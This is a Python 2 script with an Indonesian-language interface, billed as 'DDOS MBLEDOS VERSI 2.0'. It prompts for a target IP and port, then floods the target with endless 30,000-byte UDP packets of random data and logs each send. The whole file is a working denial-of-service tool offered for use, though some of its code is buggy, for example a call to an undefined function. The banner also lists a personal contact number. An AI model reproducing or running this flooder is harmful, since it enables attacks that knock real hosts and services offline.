import time 
import datetime 
import socket
import random
import sys 
import os 
import signal

os.system("clear") 
time = time.ctime(time.time()) 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(("8.8.8.8", 80))
    
def use():
      print"     \033[92m:::::::::::  :::::::   :::     :::::  :::::     ::::::   ::::::"
      print"    ::: ::: :::  :::   ::  :::     :::    ::: :::  :::  :::  :::"   
      print"   ::: ::: :::  :::::::   :::     :::::  ::: :::  :::  :::  ::::::" 
      print"  ::: ::: :::  :::   ::  :::     :::    ::: :::  :::  :::     :::"
      print" ::: ::: :::  :::::::   ::::::  :::::  :::::     ::::::   ::::::"
      print""
      print" \033[93m::::::::::::::::::::::::::::::"
      print"                           :::"
      print"                          :::::::::::::::::::::::::::::::::::"
      print""
      print"             \033[91m:::::::::::::::::::::::::::::::::::::::::::"
      print"             :::        \033[94mDDOS MBLEDOS VERSI 2.0       \033[91m:::"
      print"             \033[91m:::      \033[94mTerakhir di-update tanggal     \033[91m:::"
      print"             \033[91m:::             \033[94m31-05-2019              \033[91m:::"
      print"             \033[91m:::     \033[94mTekan CTRL + C untuk berhenti   \033[91m:::"
      print"             :::::::::::::::::::::::::::::::::::::::::::"
      print""
      print"                    \033[93mJika terjadi bug pada program dm ke:"
      print"                              \033[93mIG: waw.shit_jr"
      print"                              \033[93mWA: 6287864048620"
      print"\033[96mYOUR IP:"
      print(sock.getsockname()[0])  
      print""  
     
      ip = raw_input ("\033[95mMasukkan ip/host target:") 
      port = input ("Masukkan port: ") 
      bytes = input ("Masukkan bytes/paket:") 

      bytes = random._urandom(30000)  
      sent = 0
 
      try:
          while True:        
                sock.sendto(bytes, (ip,port)) 
                port = port + 0 
                sent = sent + 1                
                print "\033[94mWaktu \033[91m%s \033[94mMenyerang \033[91m%s \033[94mdengan port \033[91m%s \033[94mbytes \033[91m%s"%(time, ip, port, sent)               
                if port == 64559:
                   port = 1
      except socket.error as e:
          cadangan()
          while True:
                  packet = sock.recv(4096)
                  if len(packet) == 0:
                     print "\033[91mTidak ada koneksi internet, Coba periksa koneksi internet anda"     
                     cadangan()
   
def keyboard_interrupt(signal,jendela):
    print "\033[92mBerhenti"
    sys.exit(0)
signal.signal(signal.SIGINT, keyboard_interrupt)

if __name__ == '__main__': 
       use() 
    
    
    
